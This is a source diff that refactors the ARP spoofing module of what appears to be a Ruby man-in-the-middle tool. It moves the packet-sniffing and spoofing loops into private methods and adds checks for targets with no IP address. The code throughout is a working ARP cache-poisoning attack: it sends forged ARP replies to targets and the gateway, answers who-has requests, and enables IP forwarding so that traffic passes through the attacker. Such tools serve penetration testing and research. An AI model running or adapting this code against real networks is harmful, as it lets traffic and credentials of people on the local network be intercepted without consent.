@@ -65,87 +65,8 @@ class Arp < Base
 
     @ctx.firewall.enable_forwarding(true) unless @forwarding
 
-    @sniff_thread = Thread.new do
-      Logger.info 'ARP watcher started ...'
-      begin
-        @capture = PacketFu::Capture.new(
-            iface: @ctx.options.iface,
-            filter: 'arp',
-            start: true
-        )
-      rescue  Exception => e
-        Logger.error e.message
-      end
-
-      @capture.stream.each do |p|
-        begin
-          pkt = PacketFu::Packet.parse p
-          # we're only interested in 'who-has' packets
-          if pkt.arp_opcode == 1 and pkt.arp_dst_mac.to_s == '00:00:00:00:00:00'
-            is_from_us = ( pkt.arp_src_ip.to_s == @ctx.ifconfig[:ip_saddr] )
-            unless is_from_us
-              Logger.info "[ARP] #{pkt.arp_src_ip.to_s} is asking who #{pkt.arp_dst_ip.to_s} is."
-
-              send_spoofed_packet pkt.arp_dst_ip.to_s, @ctx.ifconfig[:eth_saddr], pkt.arp_src_ip.to_s, pkt.arp_src_mac.to_s
-            end
-          end
-        rescue Exception => e
-          Logger.error e.message
-        end
-      end
-    end
-
-    @spoof_thread = Thread.new do
-      prev_size = @ctx.targets.size
-      loop do
-        if not @running
-            Logger.debug 'Stopping spoofing thread ...'
-            Thread.exit
-            break
-        end
-
-        size = @ctx.targets.size
-
-        if size > prev_size
-          Logger.warn "Aquired #{size - prev_size} new targets."
-        elsif size < prev_size
-          Logger.warn "Lost #{prev_size - size} targets."
-        end
-
-        Logger.debug "Spoofing #{@ctx.targets.size} targets ..."
-
-        @ctx.targets.each do |target|
-          # targets could change, update mac addresses if needed
-          if target.mac.nil?
-            hw = Network.get_hw_address( @ctx.ifconfig, target.ip )
-            if hw.nil?
-              Logger.warn "Couldn't determine target #{ip} MAC!"
-              next
-            else
-              Logger.info "  Target MAC    : #{hw}"
-              target.mac = hw
-            end
-          # target was specified by MAC address
-          elsif target.ip_refresh
-            ip = Network.get_ip_address( @ctx, target.mac )
-            if ip.nil?
-              Logger.warn "Couldn't determine target #{target.mac} IP!"
-              next
-            else
-              Logger.info "Target #{target.mac} IP : #{ip}" if target.ip.nil? or target.ip != ip
-              target.ip = ip
-            end
-          end
-
-          send_spoofed_packet( @gateway.ip, @ctx.ifconfig[:eth_saddr], target.ip, target.mac )
-          send_spoofed_packet( target.ip, @ctx.ifconfig[:eth_saddr], @gateway.ip, @gateway.mac ) unless @ctx.options.half_duplex
-        end
-
-        prev_size = @ctx.targets.size
-
-        sleep(1)
-      end
-    end
+    @sniff_thread = Thread.new { arp_watcher }
+    @spoof_thread = Thread.new { arp_spoofer }
   end
 
   # Stop the ARP spoofing, reset firewall state and restore targets ARP table.
@@ -166,14 +87,110 @@ class Arp < Base
     Logger.info "Restoring ARP table of #{@ctx.targets.size} targets ..."
 
     @ctx.targets.each do |target|
-      unless target.mac.nil?
+      unless target.ip.nil? or target.mac.nil?
         begin
           send_spoofed_packet( @gateway.ip, @gateway.mac, target.ip, target.mac )
           send_spoofed_packet( target.ip, target.mac, @gateway.ip, @gateway.mac ) unless @ctx.options.half_duplex
         rescue; end
       end
+    end    
+  end
+
+  private
+
+  def update_targets!
+    @ctx.targets.each do |target|
+      # targets could change, update mac addresses if needed
+      if target.mac.nil?
+        hw = Network.get_hw_address( @ctx.ifconfig, target.ip )
+        if hw.nil?
+          Logger.warn "Couldn't determine target #{ip} MAC!"
+          next
+        else
+          Logger.info "  Target MAC    : #{hw}"
+          target.mac = hw
+        end
+      # target was specified by MAC address
+      elsif target.ip_refresh
+        ip = Network.get_ip_address( @ctx, target.mac )
+        if ip.nil?
+          Logger.warn "Couldn't determine target #{target.mac} IP!"
+          next
+        else
+          Logger.info "Target #{target.mac} IP : #{ip}" if target.ip.nil? or target.ip != ip
+          target.ip = ip
+        end
+      end
     end
-    sleep 1
+  end
+
+  def arp_spoofer
+    prev_size = @ctx.targets.size
+    loop do
+      if not @running
+          Logger.debug 'Stopping spoofing thread ...'
+          Thread.exit
+          break
+      end
+
+      size = @ctx.targets.size
+      if size > prev_size
+        Logger.warn "Aquired #{size - prev_size} new targets."
+      elsif size < prev_size
+        Logger.warn "Lost #{prev_size - size} targets."
+      end
+
+      Logger.debug "Spoofing #{@ctx.targets.size} targets ..."
+
+      update_targets!
+
+      @ctx.targets.each do |target|
+        unless target.ip.nil? or target.mac.nil?
+          send_spoofed_packet( @gateway.ip, @ctx.ifconfig[:eth_saddr], target.ip, target.mac )
+          send_spoofed_packet( target.ip, @ctx.ifconfig[:eth_saddr], @gateway.ip, @gateway.mac ) unless @ctx.options.half_duplex
+        end
+      end
+
+      prev_size = @ctx.targets.size
+
+      sleep(1)
+    end
+  end
+
+  def arp_watcher
+    Logger.info 'ARP watcher started ...'
+    begin
+      @capture = PacketFu::Capture.new(
+          iface: @ctx.options.iface,
+          filter: 'arp',
+          start: true
+      )
+    rescue  Exception => e
+      Logger.error e.message
+    end
+
+    @capture.stream.each do |p|
+      begin
+        if not @running
+            Logger.debug 'Stopping arp watcher thread ...'
+            Thread.exit
+            break
+        end
+
+        pkt = PacketFu::Packet.parse p
+        # we're only interested in 'who-has' packets
+        if pkt.arp_opcode == 1 and pkt.arp_dst_mac.to_s == '00:00:00:00:00:00'
+          is_from_us = ( pkt.arp_src_ip.to_s == @ctx.ifconfig[:ip_saddr] )
+          unless is_from_us
+            Logger.info "[ARP] #{pkt.arp_src_ip.to_s} is asking who #{pkt.arp_dst_ip.to_s} is."
+
+            send_spoofed_packet pkt.arp_dst_ip.to_s, @ctx.ifconfig[:eth_saddr], pkt.arp_src_ip.to_s, pkt.arp_src_mac.to_s
+          end
+        end
+      rescue Exception => e
+        Logger.error e.message
+      end
+    end
   end
 end
 end
